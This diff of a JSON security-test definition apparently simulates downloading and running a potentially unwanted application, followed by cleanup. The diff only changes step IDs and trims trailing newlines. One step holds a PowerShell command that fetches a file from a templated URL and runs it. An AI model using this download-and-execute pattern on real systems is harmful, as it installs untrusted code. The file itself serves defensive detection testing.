@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "c6f0dcdc-a5c7-4573-a3e6-44e24ca5152b",
+      "id": "3614f5fe-0a41-4ae8-b72d-a01fab710cd5",
       "type": "execute-command",
       "data": {
-        "command": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n\u0026 \"#{pua_file}\"\n",
+        "command": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n\u0026 \"#{pua_file}\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "c8c566f6-fece-44f3-bb7f-b267839efecf",
+      "id": "9dbc0ba6-4963-4c6c-92db-573b5f185389",
       "type": "execute-command",
       "data": {
-        "command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore\n",
+        "command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "c6f0dcdc-a5c7-4573-a3e6-44e24ca5152b",
+      "s": "3614f5fe-0a41-4ae8-b72d-a01fab710cd5",
       "p": "on-success",
-      "o": "c8c566f6-fece-44f3-bb7f-b267839efecf"
+      "o": "9dbc0ba6-4963-4c6c-92db-573b5f185389"
     },
     {
-      "s": "c6f0dcdc-a5c7-4573-a3e6-44e24ca5152b",
+      "s": "3614f5fe-0a41-4ae8-b72d-a01fab710cd5",
       "p": "on-failure",
-      "o": "c8c566f6-fece-44f3-bb7f-b267839efecf"
+      "o": "9dbc0ba6-4963-4c6c-92db-573b5f185389"
     }
   ],
   "tags": [
